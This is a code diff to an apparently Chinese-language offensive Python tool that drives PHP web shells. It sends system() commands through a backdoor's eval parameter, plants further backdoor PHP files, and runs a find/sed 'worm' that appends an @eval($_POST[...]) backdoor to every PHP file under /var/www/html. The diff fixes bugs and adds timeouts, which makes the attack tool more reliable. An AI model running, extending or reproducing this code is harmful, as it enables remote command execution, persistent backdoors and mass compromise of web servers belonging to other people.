@@ -24,7 +24,7 @@ ua = [
 ]
 rand_num = random.randint(1, len(ua))
 header = {}
-header["User-Agent:"] = ua[rand_num]
+header["User-Agent"] = ua[rand_num-1]
 
 def get_Command_Control(url, url_PHPpath,phpfile_Name, phpfile_Key, command):       #实现连接GET方法shell并执行命令、回显
     try:
@@ -34,9 +34,6 @@ def get_Command_Control(url, url_PHPpath,phpfile_Name, phpfile_Key, command):   
     except:
         echo.print_red("[x] 利用失败，请手动尝试利用!")
 def conn_Command_Control(url, command, phpfile_Key, selcet, ma_func):
-    # exp = {
-    #     f"{phpfile_Key}": f"system('{command}');"
-    # }
     if ma_func.lower() == "n":
         exp = {
             f"{phpfile_Key}": f"system('{command}')"
@@ -108,10 +105,6 @@ def post_Command_Control(url, phpfile_Name, phpfile_Key, command, num, url_PHPpa
                     sa = requests.post(url_exp, headers=header, data=exp)
                     echo.print_green(sa.text)
                     pay = '"find /var/www/html/ -name \\"*.php\\" -exec sed -i \'\$a<?php @eval(\$_POST[\\"5db321ce\\"]);?>\' {} \\\\;"'
-                    # exp = {
-                    #     f"{phpfile_Key}": f"system({pay})"
-                    #     # f"system('find ./ -name \"*.php\" -exec sed -i '\$a<?php @eval(\$_POST[\"{phpfile_Key + st}\"]);?>'\\;\");')"
-                    # }
                     if ma_func.lower() == "n":
                         exp = {
                             f"{phpfile_Key}": f"system('{pay}')"
@@ -133,10 +126,6 @@ def post_Command_Control(url, phpfile_Name, phpfile_Key, command, num, url_PHPpa
                         exp = {
                             f"{phpfile_Key}": f"{pay}"
                         }
-                    # exp = {
-                    #     f"{phpfile_Key}": f'system({pay})'
-                    #     # f"system('find ./ -name \"*.php\" -exec sed -i '\$a<?php @eval(\$_POST[\"{phpfile_Key + st}\"]);?>'\\;\");')"
-                    # }
                     print(args[0])
                     print("---------------------------------------------------------")
                     print(exp)
@@ -187,10 +176,6 @@ def post_Command_Control(url, phpfile_Name, phpfile_Key, command, num, url_PHPpa
                         sa = requests.post(url_exp, headers=header, data=exp)
                         echo.print_green(sa.text)
                         pay = '"find /var/www/html/ -name \\"*.php\\" -exec sed -i \'\$a<?php @eval(\$_POST[\\"5db321ce\\"]);?>\' {} \\\\;"'
-                        # exp = {
-                        #     f"{phpfile_Key}": f"system({pay})"
-                        #     # f"system('find ./ -name \"*.php\" -exec sed -i '\$a<?php @eval(\$_POST[\"{phpfile_Key + st}\"]);?>'\\;\");')"
-                        # }
                         if ma_func.lower() == "n":
                             exp = {
                                 f"{phpfile_Key}": f"system('{pay}')"
@@ -204,10 +189,6 @@ def post_Command_Control(url, phpfile_Name, phpfile_Key, command, num, url_PHPpa
                         echo.print_blue("----------------蠕虫感染完成,请手动检查-------------------")
                     elif command is None:
                         pay = '"find /var/www/html/ -name \\"*.php\\" -exec sed -i \'\$a<?php @eval(\$_POST[\\"5db321ce\\"]);?>\' {} \\\\;"'
-                        # exp = {
-                        #     f"{phpfile_Key}": f"system({pay})"
-                        #     # f"system('find ./ -name \"*.php\" -exec sed -i '\$a<?php @eval(\$_POST[\"{phpfile_Key + st}\"]);?>'\\;\");')"  find /var/www/html/ -name \"*.php\" -exec sed -i '\$a<?php @eval(\$_POST[\"cmd33\"]);?>' {} \\;
-                        # }
                         if ma_func.lower() == "n":
                             exp = {
                                 f"{phpfile_Key}": f"system('{pay}')"
@@ -366,7 +347,7 @@ def upload_PHPma(url, method, url_PHPpath, phpmaKey, ma_method, url_PHPfile, ver
                 except:
                     print("选择木马类型时出错!!!")
             else:
-                print("\033[0;35m请输入正确参数值, 否则可能会运行错误!!!\033[0m")
+                echo.print_yellow("请输入正确参数值, 否则可能会运行错误!!!")
                 return
             echo.print_purple("---------------正在植入木马----------------")
             requests.get(url=url_exp, headers=header, verify=False)
@@ -480,20 +461,20 @@ def upload_PHPma(url, method, url_PHPpath, phpmaKey, ma_method, url_PHPfile, ver
                 }
             elif ma_method.lower() == "n":
                 data = {
-                    f"{phpmaKey}": f"fputs( fopen(\'{phpfile_Name}.php\',\'w\'), \'{args[0]}\');"
+                    f"{phpmaKey}": f"fputs(fopen(\'{phpfile_Name}.php\',\'w\'), \'{args[0]}\');"
                 }
             else:
                 print("\033[0;35m请输入正确参数值, 否则可能会运行错误!!!\033[0m")
-                return
+
             print("\033[0;35m---------------正在植入木马----------------\033[0m")
             print(data)
             url_exp = url + url_PHPpath + url_PHPfile    # 写入另外的后门木马
-            requests.post(url=url_exp, data=data, headers=header, verify=False)
             print(url_exp)
-            print(args)
+            requests.post(url=url_exp, data=data, headers=header, verify=False, timeout=2)
+            print(url_exp)
             if args[1] == 0:
                 url_poc = url + url_PHPpath + phpfile_Name + ".php"
-                requs = requests.post(url_poc, headers=header, verify=False)
+                requs = requests.post(url_poc, headers=header, verify=False, timeout=2)
                 if requs.status_code == 200:
                     print(f"\033[0;35m[*] 植入后门成功,利用路径为:{url_poc}\033[0m")
                     if upload_judgement == "N" or upload_judgement == "n":
@@ -598,7 +579,7 @@ def upload_PHPma(url, method, url_PHPpath, phpmaKey, ma_method, url_PHPfile, ver
                                 outfile.write(url_poc)
                     else:
                         echo.print_red(f"{url + url_PHPpath + phpfile_Name + 'f0r.php'}利用失败!!!")
-                else:
-                    echo.print_red("[x] POST方式上传失败!!!")
+            else:
+                echo.print_red("[x] POST方式上传失败!!!")
     except:
         echo.print_yellow("\nERROR EXIT!")
